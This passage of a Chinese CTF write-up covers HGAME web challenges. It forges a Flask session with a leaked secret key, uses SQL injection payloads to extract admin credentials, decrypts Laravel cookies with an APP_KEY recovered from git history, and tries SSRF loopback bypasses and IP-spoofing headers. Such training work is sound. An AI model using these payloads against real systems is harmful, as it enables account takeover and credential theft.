<div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=err>&lt;Config</span> <span class=p>{</span><span class=err>&#39;ENV&#39;:</span> <span class=err>&#39;production&#39;,</span> <span class=err>&#39;DEBUG&#39;:</span> <span class=err>False,</span> <span class=err>&#39;TESTING&#39;:</span> <span class=err>False,</span> <span class=err>&#39;PROPAGATE_EXCEPTIONS&#39;:</span> <span class=err>None,</span> <span class=err>&#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;:</span> <span class=err>None,</span> <span class=err>&#39;SECRET_KEY&#39;:</span> <span class=err>&#39;9RxdzNwq7!nOoK3*&#39;,</span> <span class=err>&#39;PERMANENT_SESSION_LIFETIME&#39;:</span> <span class=err>datetime.timedelta(31),</span> <span class=err>&#39;USE_X_SENDFILE&#39;:</span> <span class=err>False,</span> <span class=err>&#39;SERVER_NAME&#39;:</span> <span class=err>None,</span> <span class=err>&#39;APPLICATION_ROOT&#39;:</span> <span class=err>&#39;/&#39;,</span> <span class=err>&#39;SESSION_COOKIE_NAME&#39;:</span> <span class=err>&#39;session&#39;,</span> <span class=err>&#39;SESSION_COOKIE_DOMAIN&#39;:</span> <span class=err>False,</span> <span class=err>&#39;SESSION_COOKIE_PATH&#39;:</span> <span class=err>None,</span> <span class=err>&#39;SESSION_COOKIE_HTTPONLY&#39;:</span> <span class=err>True,</span> <span class=err>&#39;SESSION_COOKIE_SECURE&#39;:</span> <span class=err>False,</span> <span class=err>&#39;SESSION_COOKIE_SAMESITE&#39;:</span> <span class=err>None,</span> <span class=err>&#39;SESSION_REFRESH_EACH_REQUEST&#39;:</span> <span class=err>True,</span> <span class=err>&#39;MAX_CONTENT_LENGTH&#39;:</span> <span class=err>None,</span> <span class=err>&#39;SEND_FILE_MAX_AGE_DEFAULT&#39;:</span> <span class=err>datetime.timedelta(0,</span> <span class=err>43200),</span> <span class=err>&#39;TRAP_BAD_REQUEST_ERRORS&#39;:</span> <span class=err>None,</span> <span class=err>&#39;TRAP_HTTP_EXCEPTIONS&#39;:</span> <span class=err>False,</span> <span class=err>&#39;EXPLAIN_TEMPLATE_LOADING&#39;:</span> <span class=err>False,</span> <span class=err>&#39;PREFERRED_URL_SCHEME&#39;:</span> <span class=err>&#39;http&#39;,</span> <span class=err>&#39;JSON_AS_ASCII&#39;:</span> <span class=err>True,</span> <span class=err>&#39;JSON_SORT_KEYS&#39;:</span> <span class=err>True,</span> <span class=err>&#39;JSONIFY_PRETTYPRINT_REGULAR&#39;:</span> <span class=err>False,</span> <span class=err>&#39;JSONIFY_MIMETYPE&#39;:</span> <span class=err>&#39;application/json&#39;,</span> <span class=err>&#39;TEMPLATES_AUTO_RELOAD&#39;:</span> <span class=err>None,</span> <span class=err>&#39;MAX_COOKIE_SIZE&#39;:</span> <span class=err>4093,</span> <span class=err>&#39;CSRF_ENABLED&#39;:</span> <span class=err>True,</span> <span class=err>&#39;SQLALCHEMY_DATABASE_URI&#39;:</span> <span class=err>&#39;mysql+pymysql:</span><span class=c1>//hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame&#39;, &#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;: True, &#39;WTF_CSRF_ENABLED&#39;: True, &#39;WTF_CSRF_CHECK_DEFAULT&#39;: True, &#39;WTF_CSRF_METHODS&#39;: {&#39;PUT&#39;, &#39;DELETE&#39;, &#39;POST&#39;, &#39;PATCH&#39;}, &#39;WTF_CSRF_FIELD_NAME&#39;: &#39;csrf_token&#39;, &#39;WTF_CSRF_HEADERS&#39;: [&#39;X-CSRFToken&#39;, &#39;X-CSRF-Token&#39;], &#39;WTF_CSRF_TIME_LIMIT&#39;: 3600, &#39;WTF_CSRF_SSL_STRICT&#39;: True, &#39;SQLALCHEMY_BINDS&#39;: None, &#39;SQLALCHEMY_NATIVE_UNICODE&#39;: None, &#39;SQLALCHEMY_ECHO&#39;: False, &#39;SQLALCHEMY_RECORD_QUERIES&#39;: None, &#39;SQLALCHEMY_POOL_SIZE&#39;: None, &#39;SQLALCHEMY_POOL_TIMEOUT&#39;: None, &#39;SQLALCHEMY_POOL_RECYCLE&#39;: None, &#39;SQLALCHEMY_MAX_OVERFLOW&#39;: None, &#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&#39;: False}&gt;
</span></code></pre></div><p>得到<code>'SECRET_KEY': '9RxdzNwq7!nOoK3*'</code>，登录自己注册的账号，解码自己的<code>.session</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>session=.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zg

python2 session_cookie_manager.py decode -c &#39;.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zg&#39;

{u&#39;csrf_token&#39;: u&#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;206&#39;, u&#39;_id&#39;: u&#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a&#39;}
</code></pre></div><p>这里千万不要改其他的东西，就改<code>u'user_id'</code>字段就可以了，改成 1 后用<code>encode</code>就行了，这里有师傅说要用 python3 ，因为 timestamp 的原因，可是这里我并没有用 python3 ，直接用 python2 就过了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>python2 session_cookie_manager.py encode -s &#39;9RxdzNwq7!nOoK3*&#39; -t &#34;{u&#39;csrf_token&#39;: u&#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a&#39;}&#34;

{u&#39;csrf_token&#39;: u&#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5&#39;, u&#39;_fresh&#39;: True, u&#39;user_id&#39;: u&#39;1&#39;, u&#39;_id&#39;: u&#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a&#39;}
</code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008065.jpg loading=lazy>
</a>
</figure></p>
<h4 id=happyphp>happyPHP</h4>
<blockquote>
<p>flag 在管理员账号下</p>
<p>http://118.25.18.223:3000/</p>
</blockquote>
<p><strong>在看 git 的时候，切记要看一下历史记录，可能会有新收获</strong></p>
<p>源码发现给了 github 仓库<code>https://github.com/Lou00/laravel</code>，是一套用 laravel 写的</p>
<p>慢慢审计，在<code>laravel/app/Http/Controllers/SessionsController.php</code>中发现一下代码</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=k>function</span> <span class=nf>store</span><span class=p>(</span><span class=nx>Request</span> <span class=nv>$request</span><span class=p>)</span>
    <span class=p>{</span>
        <span class=nv>$credentials</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>validate</span><span class=p>(</span><span class=nv>$request</span><span class=p>,</span> <span class=p>[</span>
            <span class=s1>&#39;email&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;required|email|max:100&#39;</span><span class=p>,</span>
            <span class=s1>&#39;password&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;required&#39;</span>
        <span class=p>]);</span>

        <span class=k>if</span> <span class=p>(</span><span class=nx>Auth</span><span class=o>::</span><span class=na>attempt</span><span class=p>(</span><span class=nv>$credentials</span><span class=p>))</span> <span class=p>{</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>Auth</span><span class=o>::</span><span class=na>user</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>id</span> <span class=o>===</span><span class=mi>1</span><span class=p>){</span>
                <span class=nx>session</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>flash</span><span class=p>(</span><span class=s1>&#39;info&#39;</span><span class=p>,</span><span class=s1>&#39;flag :******&#39;</span><span class=p>);</span>
                <span class=k>return</span> <span class=nx>redirect</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>route</span><span class=p>(</span><span class=s1>&#39;users.show&#39;</span><span class=p>);</span>
            <span class=p>}</span>
            <span class=nv>$name</span> <span class=o>=</span> <span class=nx>DB</span><span class=o>::</span><span class=na>select</span><span class=p>(</span><span class=s2>&#34;SELECT name FROM `users` WHERE `name`=&#39;&#34;</span><span class=o>.</span><span class=nx>Auth</span><span class=o>::</span><span class=na>user</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>name</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>);</span>
            <span class=nx>session</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>flash</span><span class=p>(</span><span class=s1>&#39;info&#39;</span><span class=p>,</span> <span class=s1>&#39;hello &#39;</span><span class=o>.</span><span class=nv>$name</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>);</span>
            <span class=k>return</span> <span class=nx>redirect</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>route</span><span class=p>(</span><span class=s1>&#39;users.show&#39;</span><span class=p>);</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
            <span class=nx>session</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>flash</span><span class=p>(</span><span class=s1>&#39;danger&#39;</span><span class=p>,</span> <span class=s1>&#39;sorry,login failed&#39;</span><span class=p>);</span>
            <span class=k>return</span> <span class=nx>redirect</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>back</span><span class=p>()</span><span class=o>-&gt;</span><span class=na>withInput</span><span class=p>();</span>
        <span class=p>}</span>
    <span class=p>}</span>
</code></pre></div><p>而整个路由有</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=s1>&#39;StaticPagesController@home&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;home&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span><span class=s1>&#39;UsersController@register&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;register&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span><span class=s1>&#39;UsersController@login&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/users&#39;</span><span class=p>,</span> <span class=s1>&#39;UsersController@show&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;users.show&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>post</span><span class=p>(</span><span class=s1>&#39;/users&#39;</span><span class=p>,</span> <span class=s1>&#39;UsersController@store&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;users.store&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>post</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=s1>&#39;SessionsController@store&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>);</span>
<span class=nx>Route</span><span class=o>::</span><span class=na>get</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>,</span> <span class=s1>&#39;SessionsController@destroy&#39;</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>(</span><span class=s1>&#39;logout&#39;</span><span class=p>);</span>
</code></pre></div><p>所以我们还是需要登录管理员账号去获取 flag，而且这里的注入点是<code>name</code>，邮箱唯一，所以我们可以注册一个<code>name=admin' or 1=1;#</code>的账户测试注入</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009312.jpg loading=lazy>
</a>
</figure></p>
<p>所以用</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>admin</span><span class=s1>&#39; union select password FROM `users` WHERE `id`= &#39;</span><span class=mi>1</span><span class=s1>&#39; ORDER BY name DESC;#
</span><span class=s1>得到 admin 的密码
</span><span class=s1>
</span><span class=s1>admin&#39;</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=o>`</span><span class=n>users</span><span class=o>`</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=o>`</span><span class=n>id</span><span class=o>`=</span><span class=w> </span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>DESC</span><span class=p>;</span><span class=o>#</span><span class=w>
</span><span class=w></span><span class=err>得到</span><span class=w> </span><span class=k>admin</span><span class=w> </span><span class=err>的邮箱</span><span class=k>admin</span><span class=o>@</span><span class=n>hgame</span><span class=p>.</span><span class=n>com</span><span class=w>
</span><span class=w>
</span><span class=w></span><span class=n>a</span><span class=s1>&#39; union select load_file(&#39;</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span><span class=s1>&#39;) ORDER BY name DESC;#
</span><span class=s1>读取失败
</span></code></pre></div><p>得到</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==

base64_decode 得到
{&#34;iv&#34;:&#34;rnVrqfCvfJgnvSTi9z7KLw==&#34;,&#34;value&#34;:&#34;EaR\/4fldOGP1G\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=&#34;,&#34;mac&#34;:&#34;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af&#34;}
</code></pre></div><p>尝试参考<a class=link href=https://wooyun.js.org/drops/Laravel%20cookie%E4%BC%AA%E9%80%A0,%E8%A7%A3%E5%AF%86,%E5%92%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html target=_blank rel=noopener>Laravel cookie 伪造,解密,和远程命令执行</a>，对<code>id=1</code>的管理员进行 cookie 伪造，但是无解。</p>
<p>找到一个 php 解密脚本，但是没有<code>$key</code>，就没办法解密。在而<code>$key</code>存在于<code>.env</code>中，我们在<code>github commit</code>中找到了被删除的<code>.env</code>，<a class=link href=https://github.com/Lou00/laravel/commit/f65702561830c4fe7e9df5936919e81be899f96f target=_blank rel=noopener>.env</a>中找到<code>APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=</code></p>
<p>搜了一下解密脚本，<a class=link href=https://gitee.com/vicself/codes/spboei8gknl1vduhfz0m388 target=_blank rel=noopener>laravel cookie 加解密</a></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=k>function</span> <span class=nf>decode</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=nv>$key</span><span class=p>){</span>
    <span class=nv>$payload</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$str</span><span class=p>),</span> <span class=k>true</span><span class=p>);</span>
    <span class=nv>$iv</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$payload</span><span class=p>[</span><span class=s1>&#39;iv&#39;</span><span class=p>]);</span>
    <span class=nv>$decrypted</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$payload</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>],</span> <span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
    <span class=k>return</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$decrypted</span><span class=p>);</span>
<span class=p>}</span>

<span class=k>function</span> <span class=nf>encode</span><span class=p>(</span><span class=nv>$value</span><span class=p>,</span><span class=nv>$key</span><span class=p>){</span>
    <span class=nv>$iv</span> <span class=o>=</span> <span class=nx>random_bytes</span><span class=p>(</span><span class=nx>openssl_cipher_iv_length</span><span class=p>(</span><span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>));</span>
    <span class=nv>$value</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span><span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nv>$iv</span><span class=p>);</span>
    <span class=nv>$iv</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$iv</span><span class=p>);</span>
    <span class=nv>$mac</span> <span class=o>=</span> <span class=nx>hash_hmac</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span><span class=nv>$iv</span><span class=o>.</span><span class=nv>$value</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
    <span class=nv>$json</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nx>compact</span><span class=p>(</span><span class=s1>&#39;iv&#39;</span><span class=p>,</span> <span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=s1>&#39;mac&#39;</span><span class=p>));</span>
    <span class=k>return</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$json</span><span class=p>);</span>
<span class=p>}</span>

<span class=sd>/**
</span><span class=sd> * .env 里面的 APP_KEY
</span><span class=sd> */</span>
<span class=nv>$key</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=s1>&#39;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=&#39;</span><span class=p>);</span>

<span class=nv>$value</span> <span class=o>=</span> <span class=s1>&#39;596|6EvT3jxKRaTwcuj5NEgdnztIjjKDX4lfqz38DGDR4hET8XaEXS35vZTksROl|&#39;</span><span class=p>;</span>

<span class=c1>// $str = encode($value,$key).PHP_EOL;
</span><span class=c1></span><span class=nv>$str</span> <span class=o>=</span> <span class=s1>&#39;eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==&#39;</span><span class=p>;</span>
<span class=k>echo</span> <span class=nx>decode</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=nv>$key</span><span class=p>);</span>
</code></pre></div><p>把相关参数填上，得到密码 9pqfPIer0Ir9UUfR，登录<code>admin@hgame.com</code>得到 flag</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004720.jpg loading=lazy>
</a>
</figure></p>
<p>这里一开始以为自己破解密码的思路不太对，而且自己之前也没有关注到 commit 找到<code>$key</code>。还是主要是找脚本不太好找，我尝试了很多个脚本都没有成功解密。后来经过师傅提点才知道确实可以密码破解，就去各种找密码了才搞定。</p>
<h4 id=happyjava>happyJava</h4>
<blockquote>
<p>java is not so hard, is it right?
hint: spring-boot-actuator</p>
<p>http://119.28.26.122:23333/index</p>
</blockquote>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002409.jpg loading=lazy>
</a>
</figure></p>
<p>题目设置很简单，目录什么的不存在的，直接访问<code>/hgame_flag</code>直接返回与其他页面一样的 404 不存在的错误</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002505.jpg loading=lazy>
</a>
</figure></p>
<p>看了一下<a class=link href=https://www.freebuf.com/news/193509.html target=_blank rel=noopener>Springboot 之 actuator 配置不当的漏洞利用</a>，以及<a class=link href=https://my.oschina.net/iyinghui/blog/1835220 target=_blank rel=noopener>spring boot 2 使用 actuator 404 的问题</a>遍历了敏感路径都是 404 ……1.x 和 2.x 路径都试过了&mldr;没啥想法</p>
<p>以下是复现 wp……orz:</p>
<p><strong>actuator 部署时，可以选择与当前项目不同端口</strong></p>
<p>于是扫一波端口可以看到<code>9876</code>跟<code>31337</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-24 23:36 CST
Nmap scan report for 119.28.26.122
Host is up (0.045s latency).
Not shown: 987 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
593/tcp   filtered http-rpc-epmap
901/tcp   filtered samba-swat
1025/tcp  filtered NFS-or-IIS
3128/tcp  filtered squid-http
4444/tcp  filtered krb524
6129/tcp  filtered unknown
6667/tcp  filtered irc
9876/tcp  open     sd
31337/tcp open     Elite

Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds
</code></pre></div><p><code>31337</code>应该不是<code>http</code>服务，于是在<code>9876</code>扫了一波目录，终于发现了泄露的关键信息，<code>http://119.28.26.122:9876/info</code>返回了空的<code>json</code>，<code>http://119.28.26.122:9876/mappings</code>返回了如下信息</p>
<pre tabindex=0><code>{&quot;/webjars/**&quot;:{&quot;bean&quot;:&quot;resourceHandlerMapping&quot;},&quot;/**&quot;:{&quot;bean&quot;:&quot;resourceHandlerMapping&quot;},&quot;/**/favicon.ico&quot;:{&quot;bean&quot;:&quot;faviconHandlerMapping&quot;},&quot;{[/index],methods=[GET]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public java.lang.String me.lightless.happyjava.controller.MainController.Index()&quot;},&quot;{[/you_will_never_find_this_interface],methods=[GET]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)&quot;},&quot;{[/secret_flag_here],methods=[GET]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)&quot;},&quot;{[/error],methods=[GET]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()&quot;},&quot;{[/error],produces=[text/html]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)&quot;},&quot;{[/error]}&quot;:{&quot;bean&quot;:&quot;requestMappingHandlerMapping&quot;,&quot;method&quot;:&quot;public org.springframework.http.ResponseEntity&lt;java.util.Map&lt;java.lang.String, java.lang.Object&gt;&gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)&quot;}}
</code></pre><p>访问<code>/secret_flag_here</code>，发现返回</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>HTTP/1.1 200 
</span><span class=err>X-Application-Context: application:23333
</span><span class=err>Content-Type: text/html;charset=UTF-8
</span><span class=err>Content-Length: 87
</span><span class=err>Date: Sun, 24 Feb 2019 15:57:48 GMT
</span><span class=err>Connection: close
</span><span class=err>
</span><span class=err>This is danger interface, only allow request from 127.0.0.1!&lt;br/&gt;Your IP:xxx.xxx.xxx.xxx(已打码)
</span></code></pre></div><p>用以下一梭子 HTTP 头伪造都没有用&mldr;</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>Client-Ip: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
</code></pre></div><p>应该是要形成 ssrf 或者其他的了吧，尝试继续访问<code>/you_will_never_find_this_interface</code>，得到</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=err>HTTP/1.1 200 
</span><span class=err>X-Application-Context: application:23333
</span><span class=err>Content-Type: text/html;charset=UTF-8
</span><span class=err>Content-Length: 20
</span><span class=err>Date: Sun, 24 Feb 2019 16:00:53 GMT
</span><span class=err>Connection: close
</span><span class=err>
</span><span class=err>`url` cant be empty!
</span></code></pre></div><p>尝试访问<code>/you_will_never_find_this_interface?url=1</code>，返回</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>emmmmmmm, something went wrong: no protocol: 1
</code></pre></div><p>尝试<code>url=http://localhost/you_will_never_find_this_interface</code>，返回</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>Dont be evil. Dont request 127.0.0.1.
</code></pre></div><p><code>http%3a//[%3a%3a]%3a23333/you_will_never_find_this_interface</code>返回 400</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain>http://example.com@127.0.0.1:23333/you_will_never_find_this_interface

http://127.0.0.1.xip.io:23333/you_will_never_find_this_interface
Dont be evil. Dont request 127.0.0.1.

http://127。0。0。1/secret_flag_here
emmmmmmm, something went wrong: Label has two-byte char: 127。0。0。1

http://0x7f000001:23333/secret_flag_here
emmmmmmm, something went wrong: DNS name not found [response code 3]

http://0177.0.0.1:23333/secret_flag_here
emmmmmmm, something went wrong: connect timed out

http://2130706433:23333/secret_flag_here
Dont be evil. Dont request 127.0.0.1.

⓵⓶⓻.⓿.⓿.⓵
emmmmmmm, something went wrong: Label has two-byte char: ⓵⓶⓻
</code></pre></div><p>尝试了很多绕过方法都没用，最后只剩下用<code>DNS Rebinding</code>来进行绕过了</p>
<p>首先了解一波<a class=link href=http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/ target=_blank rel=noopener>关于 DNS-rebinding 的总结</a>，可以发现有个比较方便的方法，就是设置两个 A 记录，一个指向 127.0.0.1，另外一个指向不是 127.0.0.1 的地址即可。</p>
